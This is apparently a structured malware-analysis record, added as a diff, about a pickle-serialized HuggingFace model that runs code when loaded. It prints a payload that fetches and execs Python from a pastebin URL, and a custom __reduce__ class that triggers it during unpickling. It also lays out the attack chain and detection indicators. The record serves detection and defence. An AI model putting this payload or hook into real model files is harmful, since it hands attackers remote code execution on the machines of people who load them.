@@ -1,0 +1,89 @@
+{
+  "package_info": {
+    "package_name": "ykilcher/totally-harmless-model (and similar pickle-based models)",
+    "package_manager": "HuggingFace Hub",
+    "package_versions": "N/A (all versions using unsafe pickle serialization)",
+    "why_malicious": "The package embeds arbitrary code execution in the model file via Python pickle serialization, allowing attacker-controlled code to run on the user's machine simply by loading the model. This violates user expectations for model safety and can be leveraged for a wide range of attacks, including data exfiltration, malware installation, or full system compromise."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "import-time (model loading via from_pretrained)",
+        "file_location": "model weights file (PyTorch .bin or similar, serialized with pickle)",
+        "required_permissions": [
+          "network"
+        ]
+      },
+      "code_snippet": "PAYLOAD = \"\"\"\nimport urllib.request\nexec(urllib.request.urlopen(\"https://pastebin.com/raw/sVvZph7V\").read().decode())\n\"\"\"",
+      "code_language": "python",
+      "code_behavior": "At import-time, the code issues an HTTP request to pastebin.com to fetch a remote Python script, then executes the downloaded code using exec, resulting in arbitrary remote code execution on the user's machine.",
+      "malice_analysis": {
+        "why_suspicious": "Fetching and executing remote code during model loading is highly suspicious and dangerous, as it allows attackers to run any code on the victim's machine without their knowledge or consent.",
+        "violated_expectations": "Normal model loading should only deserialize model weights and architecture, not execute arbitrary code or perform network requests.",
+        "similar_legitimate_use": "In rare, tightly controlled research environments, remote code execution might be used for dynamic model patching, but this is never acceptable in production or public models.",
+        "key_indicators": [
+          "Use of exec() with content fetched from a remote URL",
+          "Network request to external domain (pastebin.com) during deserialization",
+          "Code embedded in a payload variable for execution at load time"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "import-time (model loading via from_pretrained)",
+        "file_location": "model weights file (PyTorch .bin or similar, serialized with pickle)",
+        "required_permissions": []
+      },
+      "code_snippet": "class ExecDict(dict):\n    def __reduce__(self):\n        return eval, (f\"exec('''{PAYLOAD}''') or dict()\",), None, None, iter(self.items())",
+      "code_language": "python",
+      "code_behavior": "At import-time, the custom ExecDict class overrides the __reduce__ method to execute the PAYLOAD (arbitrary code) during unpickling, causing code execution on the user's machine as soon as the model is loaded.",
+      "malice_analysis": {
+        "why_suspicious": "Overriding __reduce__ to execute code during unpickling is a classic and well-documented technique for pickle-based code execution attacks, enabling attackers to run arbitrary code when a model is loaded.",
+        "violated_expectations": "Normal __reduce__ methods are intended to control object reconstruction, not to execute arbitrary code or side effects during deserialization.",
+        "similar_legitimate_use": "Custom __reduce__ is used for advanced serialization of complex objects, but never for code execution or side effects.",
+        "key_indicators": [
+          "Custom __reduce__ method returning an eval or exec call",
+          "Embedding code execution logic in serialization hooks (__reduce__)",
+          "Presence of non-standard class definitions in model files"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "User loads the model using from_pretrained, triggering unpickling of the model file.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Arbitrary code execution via the __reduce__ method in a custom class."
+    },
+    {
+      "step": 2,
+      "action": "The PAYLOAD is executed, which fetches and runs remote code from pastebin.com.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Remote code execution, potentially leading to further compromise such as data exfiltration, malware installation, or system takeover."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Arbitrary code execution triggered during model loading or unpickling",
+      "Network requests initiated by model files at import-time",
+      "Presence of custom __reduce__ methods in serialized objects that invoke eval or exec"
+    ],
+    "file_indicators": [
+      "PyTorch model files (.bin, .pt) containing custom class definitions with __reduce__ methods",
+      "Model files that trigger unexpected network activity (e.g., HTTP requests) upon loading",
+      "Pickle files with embedded code execution logic in serialization hooks"
+    ],
+    "network_indicators": [
+      "Outbound HTTP requests to pastebin.com or other code hosting services during model loading",
+      "Unexpected outbound HTTP requests from Python processes during deserialization of model files"
+    ],
+    "how_to_detect": "Monitor Python processes for network activity or code execution during model loading. Scan model files for custom __reduce__ methods or embedded exec/eval calls using static analysis tools like Picklescan. Prefer loading models in the safetensors format, which does not allow code execution. Flag model files that contain non-standard class definitions or serialization hooks that invoke code execution."
+  }
+}
